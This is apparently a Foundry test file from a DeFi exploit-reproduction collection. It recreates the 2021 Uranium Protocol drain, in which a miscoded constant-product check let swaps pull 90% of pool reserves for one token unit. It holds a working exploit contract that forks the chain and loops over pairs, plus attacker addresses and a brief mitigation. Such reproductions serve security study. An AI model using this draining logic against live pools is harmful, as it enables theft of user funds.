// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";

import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

import {IUniswapV2Factory} from "../../utils/IUniswapV2Factory.sol";
import {IUniswapV2Pair} from "../../utils/IUniswapV2Pair.sol";

// forge test --match-contract Exploit_Uranium -vvv
/*
On Apr 28, 2021 an attacker stole ~$50MM in various tokens from the Uranium Protocol.
The attacker (which is suspected to be a rugpuller) drained swap pools because a miscalculation of the
constant product in the swap function.

// Attack Overview
Total Lost: 
- 34k WBNB ($18M)
- 17.9M BUSD ($17.9M)
- 1.8k ETH ($4.7M)
- 80 BTC ($4.3M)
- 26.5k DOT ($0.8M)
- 638k ADA ($0.8M)
- 5.7M USDT ($5.7M)
- 112k U92

Attack Tx: https://bscscan.com/tx/0x5a504fe72ef7fc76dfeb4d979e533af4e23fe37e90b5516186d5787893c37991
Ethereum Transaction Viewer:
https://tx.eth.samczsun.com/binance/0x5a504fe72ef7fc76dfeb4d979e533af4e23fe37e90b5516186d5787893c37991

Exploited Contract: https://bscscan.com/address/0xA08c4571b395f81fBd3755d44eaf9a25C9399a4a
Attacker Address: https://bscscan.com/address/0xc47bdd0a852a88a019385ea3ff57cf8de79f019d
Attacker Contract: https://bscscan.com/address/0x2b528a28451e9853F51616f3B0f6D82Af8bEA6Ae
Attack Block:  6947154

// Key Info Sources
Twitter: https://twitter.com/FrankResearcher/status/1387347001172398086?s=20&t=Ki5iBMAXIitQS80Cl6BhSA
Article: https://rekt.news/uranium-rekt/
Code: https://bscscan.com/address/0xA08c4571b395f81fBd3755d44eaf9a25C9399a4a#code


Principle: Constant Product not respected
    
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
        ...

        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
        uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));
        uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));
require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UraniumSwap:
K');
        }

        _update(balance0, balance1, _reserve0, _reserve1);
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
    }

ATTACK:
The contract implementation modified the multiplied amount from 1_000 to 10_000 breaking the constant product
check (x * y = k) (10_000 * 10_000 = 100MM instead of 1MM). Because of this, the balance0 
and/or the balance1 could be significantly smaller yet swap 100 times more. It is worth noting that the
codebase was updated and the only modification introduced was the bug shown. The code before was:
        
        ...
        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(16));
        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(16));
        ...

Because of the nuances mentioned before, it is suspected that this attack was a type of "undercovered"
rugpull.

The attacker funded the malicious contract with several tokens and then performed the swap on each pair
draining the pools.

MITIGATIONS:
1) Check that the constant product checks are respected in these type of swapping pools.
*/

interface IUraniumFactory is IUniswapV2Factory {}

interface IUraniumPair is IUniswapV2Pair {}

contract Exploit_Uranium is TestHarness, TokenBalanceTracker {
    IUraniumFactory uraniumFactory = IUraniumFactory(0xA943eA143cd7E79806d670f4a7cf08F8922a454F);

    address internal attacker = 0xC47BdD0A852a88A019385ea3fF57Cf8de79F019d;

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 6_947_153);

        cheat.deal(address(this), 0);
    }

    function test_attack() external {
        // This is performed several times as the 90% is drained on each call
        for (uint256 i = 0; i < 5; i++) {
            console.log("========== Looping over all pairs step: %s ==========", i);
            attackEachPairOnce(i);
        }
    }

    function attackEachPairOnce(uint256 step) internal {
        // The attacker loops over the factory to get the first 4 pairs
        for (uint256 i = 0; i < 5; i++) {
            console.log("===== %s.%s - Draining Pool #%s =====", step, i, i);
            IUraniumPair currentPair = IUraniumPair(uraniumFactory.allPairs(i));
            IERC20 token0 = IERC20(currentPair.token0());
            IERC20 token1 = IERC20(currentPair.token1());

            if (token0.balanceOf(address(this)) == 0) {
                writeTokenBalance(address(this), address(token0), 1);
            }

            if (token1.balanceOf(address(this)) == 0) {
                writeTokenBalance(address(this), address(token1), 1);
            }

            addTokenToTracker(address(token0)); // The token tracker handles duplicates.
            addTokenToTracker(address(token1));

            token0.approve(attacker, type(uint256).max);
            token1.approve(attacker, type(uint256).max);

            currentPair.sync();

            (uint112 reserve0, uint112 reserve1,) = currentPair.getReserves();
            console.log("===== %s.%s - Before Swapping =====", step, i);
            logBalancesWithLabel("Attacker Contract", address(this));
            logBalancesWithLabel(currentPair.name(), address(currentPair));

            token0.transfer(address(currentPair), 1);
            token1.transfer(address(currentPair), 1);

            // From calltrace.
            // 1) Trigger the tx with the 100%. Compare actual values with reverted tx values
            // 2) actual values(from trace) / 100% Val(from simulation) = Fraction.
            currentPair.swap(reserve0 * 9 / 10, reserve1 * 9 / 10, address(this), new bytes(0));
            console.log("===== %s.%s - After Swapping =====", step, i);
            logBalancesWithLabel("Attacker Contract", address(this));
            logBalancesWithLabel(currentPair.name(), address(currentPair));
        }
    }
}
